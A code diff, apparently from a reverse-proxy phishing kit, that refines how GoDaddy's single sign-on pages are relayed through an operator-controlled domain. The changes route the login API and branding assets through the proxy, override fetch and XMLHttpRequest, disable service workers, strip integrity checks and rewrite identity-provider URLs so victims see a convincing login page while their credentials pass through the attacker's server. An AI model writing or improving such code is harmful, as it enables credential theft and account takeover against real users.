@@ -107,7 +107,7 @@ function generateInterceptorScript(upstreamDomain) {
   function rewriteUrl(url) {
     if (!url || typeof url !== 'string') return url;
 
-    // Block noisy tracking requests early
+    // Block tracking early
     if (/eventbus\/web|rum\/events|apm\//.test(url)) {
       console.log('[Proxy Interceptor] Blocked tracking:', url);
       return 'about:blank';
@@ -120,23 +120,24 @@ function generateInterceptorScript(upstreamDomain) {
       if (url.startsWith('http')) u = new URL(url);
       else if (url.startsWith('//')) u = new URL('https:' + url);
       else if (url.startsWith('/')) {
-        // Force GoDaddy trust-center, media, and login API through full proxy
-        if (url.includes('trust-center') || url.includes('_next/static/media') || url.includes('/v1/api/pass/login')) {
-          console.log('[Proxy Interceptor] Forced proxy for GoDaddy asset:', url);
+        // Critical: trust-center logo, media, login API, godaddy-404
+        if (url.includes('trust-center') || url.includes('_next/static/media') || 
+            url.includes('/v1/api/pass/login') || url.includes('godaddy-404')) {
+          console.log('[Proxy Interceptor] Forced full proxy for:', url);
           return 'https://' + PROXY_DOMAIN + PROXY_PREFIX + 'sso.godaddy.com' + url;
         }
         return 'https://' + PROXY_DOMAIN + PROXY_PREFIX + UPSTREAM + url;
       }
 
-      if (u && (shouldProxyDomain(u.hostname) || u.hostname.includes('godaddy') || u.pathname.includes('trust-center'))) {
-        console.log('[Proxy Interceptor] Rewrote:', url);
+      if (u && (shouldProxyDomain(u.hostname) || u.hostname.includes('godaddy'))) {
+        console.log('[Proxy Interceptor] Rewrote URL:', url);
         return 'https://' + PROXY_DOMAIN + PROXY_PREFIX + u.hostname + u.pathname + u.search + u.hash;
       }
     } catch(e) {}
     return url;
   }
 
-  // Fetch override (critical for login POST)
+  // Fetch override
   const origFetch = window.fetch;
   window.fetch = function(resource, init) {
     const rewritten = typeof resource === 'string' ? rewriteUrl(resource) : resource;
@@ -148,6 +149,14 @@ function generateInterceptorScript(upstreamDomain) {
   XMLHttpRequest.prototype.open = function(method, url) {
     return origOpen.call(this, method, rewriteUrl(url));
   };
+
+  // Block service worker registration
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register = function() {
+      console.log('[Proxy Interceptor] Blocked service worker registration');
+      return Promise.resolve({ active: null });
+    };
+  }
 
   console.log('[Proxy Interceptor] Loaded for upstream:', UPSTREAM);
 })();
@@ -239,30 +248,28 @@ export default async function handleRequest(request) {
         text = text.replace(/<(script|link)[^>]*?\s+integrity=["'][^"']*["'][^>]*>/gi, m => m.replace(/\s+integrity=["'][^"']*["']/i, ''));
       }
 
-      // === STRONGER REWRITING FOR LOGO AND ASSETS ===
-      // Trust-center logo (m365.png)
+      // === STRONGER ASSET REWRITING ===
+      // Logo & trust-center media (multiple patterns)
       text = text.replace(
         /(src|href)=["']\/?trust-center\/_next\/static\/media\/([^"']+)["']/gi,
         `\$1="https://${YOUR_DOMAIN}${PROXY_PREFIX}sso.godaddy.com/trust-center/_next/static/media/$2"`
       );
-
-      // General Next.js media
       text = text.replace(
         /(src|href)=["']\/_next\/static\/media\/([^"']+)["']/gi,
         `\$1="https://${YOUR_DOMAIN}${PROXY_PREFIX}sso.godaddy.com/_next/static/media/$2"`
       );
 
-      // Root-relative paths
+      // godaddy-404 fallback
+      text = text.replace(/\/id-id\/godaddy-404/gi, '/');
+      text = text.replace(/godaddy-404/gi, '/');
+
+      // Root-relative
       text = text.replace(/(src|href|action)=["']\/([^"']+)["']/gi, (match, attr, path) => {
         if (path.startsWith('_p/') || path.includes('data:') || path.startsWith('#')) return match;
         return `${attr}="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path}"`;
       });
 
-      // Cleanup
-      text = text.replace(/\/id-id\/godaddy-404/gi, '/');
-      text = text.replace(/godaddy-404/gi, '');
-
-      // Full domain rewriting
+      // Full domain
       Object.keys(IDENTITY_PROVIDERS).forEach(d => {
         const esc = d.replace(/\./g, '\\.');
         text = text.replace(new RegExp('https?://' + esc + '([^"\'\\s)]*)', 'gi'),
